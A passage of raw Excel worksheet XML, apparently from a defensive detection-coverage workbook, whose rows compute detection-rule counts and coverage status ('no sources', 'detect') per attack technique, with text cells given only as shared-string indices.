        <f t="array" ref="M583">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N583" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O583" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P583" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S58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83" t="s">
        <v>2513</v>
      </c>
      <c r="U583" t="s">
        <v>2710</v>
      </c>
      <c r="V583" t="s">
        <v>2669</v>
      </c>
      <c r="W583" t="b">
        <v>1</v>
      </c>
      <c r="X583" t="s">
        <v>2697</v>
      </c>
    </row>
    <row r="584" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A584" t="s">
        <v>2711</v>
      </c>
      <c r="B584" t="s">
        <v>2711</v>
      </c>
      <c r="C584" t="s">
        <v>26</v>
      </c>
      <c r="D584" t="s">
        <v>0</v>
      </c>
      <c r="E584" t="s">
        <v>2540</v>
      </c>
      <c r="F584" s="9">
        <f t="shared" si="9"/>
        <v>1</v>
      </c>
      <c r="G584" s="9" cm="1">
        <f t="array" ref="G584">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H584" s="9" cm="1">
        <f t="array" ref="H584">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>4</v>
      </c>
      <c r="I584" s="9" t="str" cm="1">
        <f t="array" ref="I584">IF(SUM(IF($C584=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C584=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J584" s="9" cm="1">
        <f t="array" ref="J58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584" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>4</v>
      </c>
      <c r="M584" s="9" cm="1">
        <f t="array" ref="M584">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>4</v>
      </c>
      <c r="N584" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O584" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P584" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S58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84" t="s">
        <v>2513</v>
      </c>
      <c r="U584" t="s">
        <v>2712</v>
      </c>
      <c r="V584" t="s">
        <v>2713</v>
      </c>
      <c r="W584" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="585" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A585" t="s">
        <v>2711</v>
      </c>
      <c r="B585" t="s">
        <v>2714</v>
      </c>
      <c r="C585" t="s">
        <v>2715</v>
      </c>
      <c r="D585" t="s">
        <v>0</v>
      </c>
      <c r="E585" t="s">
        <v>2540</v>
      </c>
      <c r="F585" s="9">
        <f t="shared" si="9"/>
        <v>1</v>
      </c>
      <c r="G585" s="9" cm="1">
        <f t="array" ref="G585">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H585" s="9" t="str" cm="1">
        <f t="array" ref="H585">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I585" s="9" t="str" cm="1">
        <f t="array" ref="I585">IF(SUM(IF($C585=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C585=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J585" s="9" t="str" cm="1">
        <f t="array" ref="J58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85" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M585" s="9" cm="1">
        <f t="array" ref="M585">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N585" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O585" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P585" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S58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85" t="s">
        <v>2513</v>
      </c>
      <c r="U585" t="s">
        <v>2716</v>
      </c>
      <c r="V585" t="s">
        <v>2717</v>
      </c>
      <c r="W585" t="b">
        <v>1</v>
      </c>
      <c r="X585" t="s">
        <v>2711</v>
      </c>
    </row>
    <row r="586" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A586" t="s">
        <v>2711</v>
      </c>
      <c r="B586" t="s">
        <v>2718</v>
      </c>
      <c r="C586" t="s">
        <v>2719</v>
      </c>
      <c r="D586" t="s">
        <v>0</v>
      </c>
      <c r="E586" t="s">
        <v>2540</v>
      </c>
      <c r="F586" s="9">
        <f t="shared" si="9"/>
        <v>1</v>
      </c>
      <c r="G586" s="9" cm="1">
        <f t="array" ref="G586">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H586" s="9" t="str" cm="1">
        <f t="array" ref="H586">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I586" s="9" t="str" cm="1">
        <f t="array" ref="I586">IF(SUM(IF($C586=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C586=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J586" s="9" t="str" cm="1">
        <f t="array" ref="J58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86" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M586" s="9" cm="1">
        <f t="array" ref="M586">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N586" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O586" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P586" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S58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86" t="s">
        <v>2513</v>
      </c>
      <c r="U586" t="s">
        <v>2720</v>
      </c>
      <c r="V586" t="s">
        <v>2721</v>
      </c>
      <c r="W586" t="b">
        <v>1</v>
      </c>
      <c r="X586" t="s">
        <v>2711</v>
      </c>
    </row>
    <row r="587" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A587" t="s">
        <v>2711</v>
      </c>
      <c r="B587" t="s">
        <v>2722</v>
      </c>
      <c r="C587" t="s">
        <v>2723</v>
      </c>
      <c r="D587" t="s">
        <v>0</v>
      </c>
      <c r="F587" s="9">
        <f t="shared" si="9"/>
        <v>1</v>
      </c>
      <c r="G587" s="9" cm="1">
        <f t="array" ref="G587">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H587" s="9" t="str" cm="1">
        <f t="array" ref="H587">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I587" s="9" t="str" cm="1">
        <f t="array" ref="I587">IF(SUM(IF($C587=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C587=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J587" s="9" t="str" cm="1">
        <f t="array" ref="J58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87" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M587" s="9" cm="1">
        <f t="array" ref="M587">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N587" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O587" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P587" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S58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87" t="s">
        <v>2513</v>
      </c>
      <c r="U587" t="s">
        <v>2724</v>
      </c>
      <c r="V587" t="s">
        <v>2669</v>
      </c>
      <c r="W587" t="b">
        <v>1</v>
      </c>
      <c r="X587" t="s">
        <v>2711</v>
      </c>
    </row>
    <row r="588" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A588" t="s">
        <v>2711</v>
      </c>
      <c r="B588" t="s">
        <v>2725</v>
      </c>
      <c r="C588" t="s">
        <v>2726</v>
      </c>
      <c r="D588" t="s">
        <v>0</v>
      </c>
      <c r="E588" t="s">
        <v>2540</v>
      </c>
      <c r="F588" s="9">
        <f t="shared" si="9"/>
        <v>1</v>
      </c>
      <c r="G588" s="9" cm="1">
        <f t="array" ref="G588">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H588" s="9" t="str" cm="1">
        <f t="array" ref="H588">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I588" s="9" t="str" cm="1">
        <f t="array" ref="I588">IF(SUM(IF($C588=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C588=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J588" s="9" t="str" cm="1">
        <f t="array" ref="J58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88" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M588" s="9" cm="1">
        <f t="array" ref="M588">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N588" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O588" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P588" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S58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88" t="s">
        <v>2513</v>
      </c>
      <c r="U588" t="s">
        <v>2727</v>
      </c>
      <c r="V588" t="s">
        <v>2728</v>
      </c>
      <c r="W588" t="b">
        <v>1</v>
      </c>
      <c r="X588" t="s">
        <v>2711</v>
      </c>
    </row>
    <row r="589" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A589" t="s">
        <v>2729</v>
      </c>
      <c r="B589" t="s">
        <v>2729</v>
      </c>
      <c r="C589" t="s">
        <v>115</v>
      </c>
      <c r="D589" t="s">
        <v>0</v>
      </c>
      <c r="F589" s="9">
        <f t="shared" si="9"/>
        <v>1</v>
      </c>
      <c r="G589" s="9" cm="1">
        <f t="array" ref="G589">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H589" s="9" cm="1">
        <f t="array" ref="H589">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>3</v>
      </c>
      <c r="I589" s="9" t="str" cm="1">
        <f t="array" ref="I589">IF(SUM(IF($C589=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C589=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J589" s="9" cm="1">
        <f t="array" ref="J58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589" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>3</v>
      </c>
      <c r="M589" s="9" cm="1">
        <f t="array" ref="M589">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>3</v>
      </c>
      <c r="N589" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O589" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P589" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S58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89" t="s">
        <v>2513</v>
      </c>
      <c r="U589" t="s">
        <v>2730</v>
      </c>
      <c r="V589" t="s">
        <v>2669</v>
      </c>
      <c r="W589" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="590" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A590" t="s">
        <v>2729</v>
      </c>
      <c r="B590" t="s">
        <v>2731</v>
      </c>
      <c r="C590" t="s">
        <v>2732</v>
      </c>
      <c r="D590" t="s">
        <v>0</v>
      </c>
      <c r="F590" s="9">
        <f t="shared" si="9"/>
        <v>1</v>
      </c>
      <c r="G590" s="9" cm="1">
        <f t="array" ref="G590">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H590" s="9" t="str" cm="1">
        <f t="array" ref="H590">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I590" s="9" t="str" cm="1">
        <f t="array" ref="I590">IF(SUM(IF($C590=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C590=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J590" s="9" t="str" cm="1">
        <f t="array" ref="J59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90" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M590" s="9" cm="1">
        <f t="array" ref="M590">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N590" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O590" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P590" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S59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90" t="s">
        <v>2513</v>
      </c>
      <c r="U590" t="s">
        <v>2733</v>
      </c>
      <c r="V590" t="s">
        <v>2669</v>
      </c>
      <c r="W590" t="b">
        <v>1</v>
      </c>
      <c r="X590" t="s">
        <v>2729</v>
      </c>
    </row>
    <row r="591" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A591" t="s">
        <v>2729</v>
      </c>
      <c r="B591" t="s">
        <v>2734</v>
      </c>
      <c r="C591" t="s">
        <v>2735</v>
      </c>
      <c r="D591" t="s">
        <v>0</v>
      </c>
      <c r="F591" s="9">
        <f t="shared" si="9"/>
        <v>1</v>
      </c>
      <c r="G591" s="9" cm="1">
        <f t="array" ref="G591">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H591" s="9" t="str" cm="1">
        <f t="array" ref="H591">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I591" s="9" t="str" cm="1">
        <f t="array" ref="I591">IF(SUM(IF($C591=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C591=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J591" s="9" t="str" cm="1">
        <f t="array" ref="J59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91" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M591" s="9" cm="1">
        <f t="array" ref="M591">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N591" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O591" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P591" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S59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91" t="s">
        <v>2513</v>
      </c>
      <c r="U591" t="s">
        <v>2736</v>
      </c>
      <c r="V591" t="s">
        <v>2669</v>
      </c>
      <c r="W591" t="b">
        <v>1</v>
      </c>
      <c r="X591" t="s">
        <v>2729</v>
      </c>
    </row>
    <row r="592" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A592" t="s">
        <v>2729</v>
      </c>
      <c r="B592" t="s">
        <v>2737</v>
      </c>
      <c r="C592" t="s">
        <v>2738</v>
      </c>
      <c r="D592" t="s">
        <v>0</v>
      </c>
      <c r="F592" s="9">
        <f t="shared" si="9"/>
        <v>1</v>
      </c>
      <c r="G592" s="9" cm="1">
        <f t="array" ref="G592">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H592" s="9" t="str" cm="1">
        <f t="array" ref="H592">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I592" s="9" t="str" cm="1">
        <f t="array" ref="I592">IF(SUM(IF($C592=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C592=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J592" s="9" t="str" cm="1">
        <f t="array" ref="J59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92" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M592" s="9" cm="1">
        <f t="array" ref="M592">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N592" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O592" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P592" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S59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92" t="s">
        <v>2513</v>
      </c>
      <c r="U592" t="s">
        <v>2739</v>
      </c>
      <c r="V592" t="s">
        <v>2740</v>
